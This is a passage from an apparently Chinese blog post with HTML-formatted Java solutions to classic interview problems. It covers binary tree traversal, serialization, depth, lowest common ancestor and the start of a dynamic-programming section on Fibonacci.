class="hljs-keyword">int</span>[ans.size()];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;i &lt; ans.size();i++)&#123;<br>        res[i] = ans.get(i);<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="5-6-从上到下打印二叉树Ⅱ"><a href="#5-6-从上到下打印二叉树Ⅱ" class="headerlink" title="5.6 从上到下打印二叉树Ⅱ"></a>5.6 从上到下打印二叉树Ⅱ</h2><p>​    题目：从上到下按层打印二叉树，同一层的节点按从左到右的顺序打印，每一层打印到一行。</p><p>​    <font color='red'>当前层打印循环：</font> 循环次数为当前层节点数（即队列 <code>queue</code> 长度）；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> List&lt;List&lt;Integer&gt;&gt; levelOrder(TreeNode root) &#123;<br>    Queue&lt;TreeNode&gt; queue = <span class="hljs-keyword">new</span> LinkedList&lt;TreeNode&gt;();<br>    List&lt;List&lt;Integer&gt;&gt; res = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<br>    <span class="hljs-keyword">if</span> (root != <span class="hljs-keyword">null</span>)&#123;<br>        queue.add(root);<br>    &#125;<br>    <span class="hljs-keyword">while</span> (!queue.isEmpty())&#123;<br>        List&lt;Integer&gt; tmp = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = queue.size();i &gt; <span class="hljs-number">0</span>; i--)&#123;<br>            TreeNode node = queue.poll();<br>            tmp.add(node.val);<br>            <span class="hljs-keyword">if</span> (node.left != <span class="hljs-keyword">null</span>)&#123;<br>                queue.add(node.left);<br>            &#125;<br>            <span class="hljs-keyword">if</span> (node.right != <span class="hljs-keyword">null</span>)&#123;<br>                queue.add(node.right);<br>            &#125;<br>        &#125;<br>        res.add(tmp);<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><font color='red'>注意</font>for循环时不能使用下列操作：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;i &lt; queue.size(); i++)&#123;<br>    TreeNode node = queue.poll();<br>    tmp.add(node.val);<br>    <span class="hljs-keyword">if</span> (node.left != <span class="hljs-keyword">null</span>)&#123;<br>        queue.add(node.left);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (node.right != <span class="hljs-keyword">null</span>)&#123;<br>        queue.add(node.right);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>for循环第二个条件是每次循环都要执行的，而队列的长度一直变化，所以应该使用i--的方式循环。## 5.7 从上到下打印二叉树Ⅲ​    题目：请实现一个函数按照之字形顺序打印二叉树，即第一行按照从左到右的顺序打印，第二层按照从右到左的顺序打印，第三行再按照从左到右的顺序打印，其他行以此类推。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> List&lt;List&lt;Integer&gt;&gt; levelOrder(TreeNode root) &#123;<br>    Queue&lt;TreeNode&gt; queue = <span class="hljs-keyword">new</span> LinkedList&lt;TreeNode&gt;();<br>    List&lt;List&lt;Integer&gt;&gt; res = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<br>    <span class="hljs-keyword">if</span> (root != <span class="hljs-keyword">null</span>)&#123;<br>        queue.add(root);<br>    &#125;<br>    Boolean flag = <span class="hljs-keyword">false</span>;<br>    <span class="hljs-keyword">while</span> (!queue.isEmpty())&#123;<br>        LinkedList&lt;Integer&gt; tmp = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = queue.size();i &gt; <span class="hljs-number">0</span>; i--)&#123;<br>            TreeNode node = queue.poll();<br>            <span class="hljs-keyword">if</span>(!flag)&#123;<br>                tmp.addLast(node.val);<br>            &#125;<span class="hljs-keyword">else</span> &#123;<br>                tmp.addFirst(node.val);<br>            &#125;<br>            <span class="hljs-keyword">if</span> (node.left != <span class="hljs-keyword">null</span>)&#123;<br>                queue.add(node.left);<br>            &#125;<br>            <span class="hljs-keyword">if</span> (node.right != <span class="hljs-keyword">null</span>)&#123;<br>                queue.add(node.right);<br>            &#125;<br>        &#125;<br>        flag = !flag;<br>        res.add(tmp);<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure>## 5.8 二叉搜索树的后序遍历序列​    题目：输入一个整数数组，判断该数组是不是某<font color='red'>二叉搜索树</font>的后序遍历结果。如果是则返回 `true`，否则返回 `false`。假设输入的数组的任意两个数字都互不相同。​    该二叉搜索树并不是给定的，而是判断给定的整数数组是否符合二叉搜索树的后序遍历定义。方法一：递归分治<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">verifyPostorder</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] postorder)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> recur(postorder,<span class="hljs-number">0</span>,postorder.length-<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">recur</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] postorder, <span class="hljs-keyword">int</span> i, <span class="hljs-keyword">int</span> j)</span></span>&#123;<br>    <span class="hljs-keyword">if</span> (i &gt;= j)&#123;<span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;&#125;<br>    <span class="hljs-keyword">int</span> p = i;<br>    <span class="hljs-keyword">while</span> (postorder[p] &lt; postorder[j])&#123;p++;&#125;<br>    <span class="hljs-keyword">int</span> m = p;<br>    <span class="hljs-keyword">while</span> (postorder[p] &gt; postorder[j])&#123;p++;&#125;<br>    <span class="hljs-keyword">return</span> p == j &amp;&amp; recur(postorder,i,m-<span class="hljs-number">1</span>) &amp;&amp; recur(postorder,m,j-<span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure>这里递归的终止条件是i>=j而不是i==j，因为左子树为空的时候recur(i,m-1)时*i>j*。方法二：辅助单调栈<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">verifyPostorder</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] postorder)</span> </span>&#123;<br>       Stack&lt;Integer&gt; stack = <span class="hljs-keyword">new</span> Stack&lt;&gt;();<br>       <span class="hljs-keyword">int</span> root = Integer.MAX_VALUE;<br>       <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = postorder.length - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>           <span class="hljs-keyword">if</span>(postorder[i] &gt; root) <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>           <span class="hljs-keyword">while</span>(!stack.isEmpty() &amp;&amp; stack.peek() &gt; postorder[i])<br>           root = stack.pop();<br>           stack.add(postorder[i]);<br>       &#125;<br>       <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>   &#125;<br></code></pre></td></tr></table></figure>## 5.9 二叉树中和为某一值的路径​    题目：输入一棵二叉树和一个整数，打印出二叉树中节点值的和为输入整数的所有路径。从树的根节点开始往下一直到叶节点所经过的节点形成一条路径。- 记录路径时若直接执行 res.append(path) 是将 path 对象加入了 res 。后续 path 改变时， res 中的 path 对象也会随之改变。应该res.append(list(path))进行<font color = 'red'>深拷贝</font> 。- 注意path是全局变量，所以回溯前需要将当前结点从path中删除。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java">LinkedList&lt;List&lt;Integer&gt;&gt; res = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;();<br>LinkedList&lt;Integer&gt; path = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;();<br><span class="hljs-keyword">public</span> List&lt;List&lt;Integer&gt;&gt; pathSum(TreeNode root, <span class="hljs-keyword">int</span> sum) &#123;<br>    recur(root,sum);<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">recur</span><span class="hljs-params">(TreeNode root,<span class="hljs-keyword">int</span> tar)</span></span>&#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-keyword">null</span>)&#123;<span class="hljs-keyword">return</span>;&#125;<br>    path.add(root.val);<br>    tar -= root.val;<br>    <span class="hljs-keyword">if</span> (tar == <span class="hljs-number">0</span> &amp;&amp; root.left == <span class="hljs-keyword">null</span> &amp;&amp; root.right == <span class="hljs-keyword">null</span>)&#123;<br>        res.add(<span class="hljs-keyword">new</span> LinkedList(path));<br>    &#125;<br>    recur(root.left,tar);<br>    recur(root.right,tar);<br>    path.removeLast();<br>&#125;<br></code></pre></td></tr></table></figure>## 5.10 二叉搜索树与双向链表题目：输入一棵二叉搜索树，将该二叉搜索树转换成一个排序的循环双向链表。要求不能创建任何新的节点，只能调整树中节点指针的指向。为了让您更好地理解问题，以下面的二叉搜索树为例： <img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/bstdlloriginalbst.png" alt="img" style="zoom: 50%;" />​    我们希望将这个二叉搜索树转化为双向循环链表。链表中的每个节点都有一个前驱和后继指针。对于双向循环链表，第一个节点的前驱是最后一个节点，最后一个节点的后继是第一个节点。​    下图展示了上面的二叉搜索树转化成的链表。“head” 表示指向链表中有最小元素的节点。 ![img](http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/bstdllreturndll.png)​        特别地，我们希望可以就地完成转换操作。当转化完成以后，树中节点的左指针需要指向前驱，树中节点的右指针需要指向后继。还需要返回链表中的第一个节点的指针。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"> Node head, pre;<br><br> <span class="hljs-function"><span class="hljs-keyword">public</span> Node <span class="hljs-title">treeToDoublyList</span><span class="hljs-params">(Node root)</span> </span>&#123;<br>     <span class="hljs-keyword">if</span> (root == <span class="hljs-keyword">null</span>)&#123;<br>         <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>     &#125;<br>     dfs(root);<br>     head.left = pre;<br>     pre.right = head;<br>     <span class="hljs-keyword">return</span> head;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(Node cur)</span></span>&#123;<br>     <span class="hljs-keyword">if</span> (cur == <span class="hljs-keyword">null</span>)&#123;<span class="hljs-keyword">return</span>;&#125;<br>     dfs(cur.left);<br>     <span class="hljs-keyword">if</span> (pre == <span class="hljs-keyword">null</span>)&#123;<br>         head = cur;<br>     &#125;<span class="hljs-keyword">else</span> &#123;pre.right = cur;&#125;<br>     cur.left = pre;<br>     pre = cur;<br>     dfs(cur.right);<br>&#125;<br></code></pre></td></tr></table></figure>## 5.11 序列化二叉树​    题目：​    请实现两个函数，分别用来序列化和反序列化二叉树。​    示例: ​    你可以将以下二叉树：​    1   / \  2   3     / \    4   5序列化为 "[1,2,3,null,null,4,5]"<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">serialize</span><span class="hljs-params">(TreeNode root)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-keyword">null</span>)&#123;<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;[]&quot;</span>;&#125;<br>    StringBuilder res = <span class="hljs-keyword">new</span> StringBuilder(<span class="hljs-string">&quot;[&quot;</span>);<br>    Queue&lt;TreeNode&gt; queue = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;()&#123;&#123;add(root);&#125;&#125;;<br>    <span class="hljs-keyword">while</span> (!queue.isEmpty())&#123;<br>        TreeNode node = queue.poll();<br>        <span class="hljs-keyword">if</span> (node != <span class="hljs-keyword">null</span>)&#123;<br>            res.append(node.val+<span class="hljs-string">&quot;,&quot;</span>);<br>            queue.add(node.left);<br>            queue.add(node.right);<br>        &#125;<span class="hljs-keyword">else</span> &#123;res.append(<span class="hljs-string">&quot;null,&quot;</span>);&#125;<br>    &#125;<br>    res.deleteCharAt(res.length()-<span class="hljs-number">1</span>);<br>    res.append(<span class="hljs-string">&quot;]&quot;</span>);<br>    <span class="hljs-keyword">return</span> res.toString();<br>&#125;<br><br><span class="hljs-comment">/**Decodes your encoded data to tree.*/</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> TreeNode <span class="hljs-title">deserialize</span><span class="hljs-params">(String data)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (data.equals(<span class="hljs-string">&quot;[]&quot;</span>))&#123;<span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;&#125;<br>    String[] vals = data.substring(<span class="hljs-number">1</span>,data.length()-<span class="hljs-number">1</span>).split(<span class="hljs-string">&quot;,&quot;</span>);<br>    TreeNode root = <span class="hljs-keyword">new</span> TreeNode(Integer.parseInt(vals[<span class="hljs-number">0</span>]));<br>    Queue&lt;TreeNode&gt; queue = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;()&#123;&#123;add(root);&#125;&#125;;<br>    <span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span>(!queue.isEmpty())&#123;<br>        TreeNode node = queue.poll();<br>        <span class="hljs-keyword">if</span> (!vals[i].equals(<span class="hljs-string">&quot;null&quot;</span>))&#123;<br>            node.left = <span class="hljs-keyword">new</span> TreeNode(Integer.parseInt(vals[i]));<br>            queue.add(node.left);<br>        &#125;<br>        i++;<br>        <span class="hljs-keyword">if</span> (!vals[i].equals(<span class="hljs-string">&quot;null&quot;</span>))&#123;<br>            node.right = <span class="hljs-keyword">new</span> TreeNode(Integer.parseInt(vals[i]));<br>            queue.add(node.right);<br>        &#125;<br>        i++;<br>    &#125;<br>    <span class="hljs-keyword">return</span> root;<br>&#125;<br></code></pre></td></tr></table></figure>## 5.12 二叉搜索树的第k大节点​    题目：给定一棵二叉搜索树，请找出其中第k大的节点。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">int</span> res,k;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">kthLargest</span><span class="hljs-params">(TreeNode root, <span class="hljs-keyword">int</span> k)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.k = k;<br>        dfs(root);<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(TreeNode root)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (root == <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        dfs(root.right);<br>        <span class="hljs-keyword">if</span> (k == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        k--;<br>        <span class="hljs-keyword">if</span> (k == <span class="hljs-number">0</span>) &#123;<br>            res = root.val;<br>        &#125;<br>        dfs(root.left);<br>    &#125;<br></code></pre></td></tr></table></figure>## 5.13 二叉树的深度Ⅰ​    题目：输入一棵二叉树的根节点，求该树的深度。从根节点到叶节点依次经过的节点（含根、叶节点）形成树的一条路径，最长路径的长度为树的深度。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">maxDepth</span><span class="hljs-params">(TreeNode root)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-keyword">null</span>)&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<br>    <span class="hljs-keyword">return</span> Math.max(maxDepth(root.left), maxDepth(root.right)) + <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure>## 5.14 二叉树的深度Ⅱ​    题目：输入一棵二叉树的根节点，判断该树是不是平衡二叉树。如果某二叉树中任意节点的左右子树的深度相差不超过1，那么它就是一棵平衡二叉树。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isBalanced</span><span class="hljs-params">(TreeNode root)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-keyword">null</span>) &#123;<span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;&#125;<br>    <span class="hljs-keyword">return</span> Math.abs(depth(root.left) - depth(root.right)) &lt;= <span class="hljs-number">1</span> &amp;&amp; isBalanced(root.left) &amp;&amp; isBalanced(root.right);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> <span class="hljs-title">depth</span><span class="hljs-params">(TreeNode root)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-keyword">null</span>) &#123;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<br>    <span class="hljs-keyword">return</span> Math.max(depth(root.left), depth(root.right)) + <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure>## 5.15 二叉搜索树的最近公共祖先​    题目：给定一个二叉搜索树, 找到该树中两个指定节点的最近公共祖先。百度百科中最近公共祖先的定义为：“对于有根树 T 的两个结点 p、q，最近公共祖先表示为一个结点 x，满足 x 是 p、q 的祖先且 x 的深度尽可能大（一个节点也可以是它自己的祖先）。”例如，给定如下二叉搜索树:  root = [6,2,8,0,4,7,9,null,null,3,5]![img](https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/14/binarysearchtree_improved.png)若 root 是 p,q的 最近公共祖先 ，则只可能为以下情况之一：p 和 q 在 root 的子树中，且分列 root 的 异侧（即分别在左、右子树中）；p = root，且 q 在 root 的左或右子树中；q = root，且 p 在 root 的左或右子树中；<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> TreeNode <span class="hljs-title">lowestCommonAncestor</span><span class="hljs-params">(TreeNode root, TreeNode p, TreeNode q)</span> </span>&#123;<br>    <span class="hljs-keyword">while</span> (root != <span class="hljs-keyword">null</span>)&#123;<br>        <span class="hljs-keyword">if</span> (root.val &lt; p.val &amp;&amp; root.val &lt; q.val)&#123;<br>            root = root.right;<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (root.val &gt; p.val &amp;&amp; root.val &gt; q.val)&#123;<br>            root = root.left;<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> root;<br>&#125;<br></code></pre></td></tr></table></figure>## 5.16 二叉树的最近公共祖先​    题目：给定一个二叉树, 找到该树中两个指定节点的最近公共祖先。百度百科中最近公共祖先的定义为：“对于有根树 T 的两个结点 p、q，最近公共祖先表示为一个结点 x，满足 x 是 p、q 的祖先且 x 的深度尽可能大（一个节点也可以是它自己的祖先）。”例如，给定如下二叉树:  root = [3,5,1,6,2,0,8,null,null,7,4]![img](https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/15/binarytree.png)- 三种情况：  - p q 一个在左子树 一个在右子树 那么当前节点即是最近公共祖先（返回）  - p q 都在左子树 （递归左子树）  - p q 都在右子树（递归右子树）后序遍历，从底至顶回溯<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> TreeNode <span class="hljs-title">lowestCommonAncestor</span><span class="hljs-params">(TreeNode root, TreeNode p, TreeNode q)</span> </span>&#123;<br>       <span class="hljs-comment">//递归出口</span><br>       <span class="hljs-keyword">if</span> (root == <span class="hljs-keyword">null</span> || root == p || root == q) &#123;<br>           <span class="hljs-keyword">return</span> root;<br>       &#125;<br>       <span class="hljs-comment">//在左子树中找p或q</span><br>       TreeNode left = lowestCommonAncestor(root.left, p, q);<br>       <span class="hljs-comment">//在右子树中找p或q</span><br>       TreeNode right = lowestCommonAncestor(root.right, p, q);<br>      <br>       <span class="hljs-comment">//都分布在左侧，也就是右侧没找到</span><br>       <span class="hljs-keyword">if</span> (right == <span class="hljs-keyword">null</span>) &#123;<br>           <span class="hljs-keyword">return</span> left;<br>       &#125;<br>       <span class="hljs-comment">//都分布在右侧，也就是左侧没找到</span><br>       <span class="hljs-keyword">if</span> (left== <span class="hljs-keyword">null</span>) &#123;<br>           <span class="hljs-keyword">return</span> right;<br>       &#125;<br>       <span class="hljs-comment">//最后一种情况分布在异侧 if(left != null &amp;&amp; right != null)</span><br>       <span class="hljs-keyword">return</span> root;<br>   &#125;<br></code></pre></td></tr></table></figure># 6. 动态规划## 6.1 斐波那契数列​    题目：大家都知道斐波那契数列，现在要求输入一个整数n，请你输出斐波那契数列的第n项（从0开始，第0项为0，第1项是1）。n<=39首先斐波那契数列：$$f(n)=\begin{cases} 0, & n=0\\1, &n=1\\f(n-1)+f(n-2),&n>1\end{cases}$$公式并不难，经典的递归解法是：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">Fibonacci</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span>(n&lt;=<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-keyword">return</span> n;<br>    &#125;<br>    <span class="hljs-keyword">return</span> Fibonacci(n-<span class="hljs-number">1</span>) + Fibonacci(n-<span class="hljs-number">2</span>);<br>&#125;<br></code></pre></td></tr></table></figure>​    这种解法虽然简单，但是有太多的重复计算影响效率。我们以求解f(10)为例来分析递归的求解过程。想求得f(10)，需要先求得f(9)和f(8)。同样，想求得f(9)，需要先求得f(8)和f(7)……这样计算有很多结点是重复的，且重复的结点会随着n的增大而急剧增加，时间复杂度以n的指数的方式递增。​    实用解法：上述递归算法慢是因为重复计算太多，我们应该想办法避免重复计算。简单的方法是从下往上计算。可以用一个数组把计算过的结果保存起来。比如<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">Fibonacci</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> ans[] = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">40</span>];<br>    ans[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    ans[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">2</span>;i&lt;=n;i++)&#123;<br>        ans[i] = ans[i-<span class="hljs-number">1</span>] + ans[i-<span class="hljs-number">2</span>];<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans[n];<br>&#125;<br></code></pre></td></tr></table></figure>用数组会占用O(n)的空间，事实上我们只需要存储两个值即可完成计算：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">Fibonacci</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> 